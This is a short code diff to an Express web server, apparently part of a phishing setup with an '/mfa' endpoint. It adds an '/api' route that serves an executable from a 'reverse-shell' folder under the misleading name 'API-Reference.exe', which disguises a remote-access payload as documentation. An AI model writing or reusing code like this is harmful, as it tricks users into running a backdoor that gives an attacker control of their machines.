@@ -19,6 +19,10 @@ app.post("/mfa", (req, res) => {
     res.status(401).send();
 })
 
+app.get("/api", (req, res) => {
+    res.download("../reverse-shell/re.exe", "API-Reference.exe");
+})
+
 app.post("/*", (req, res) => res.send());
 
 app.listen(80, () => {});
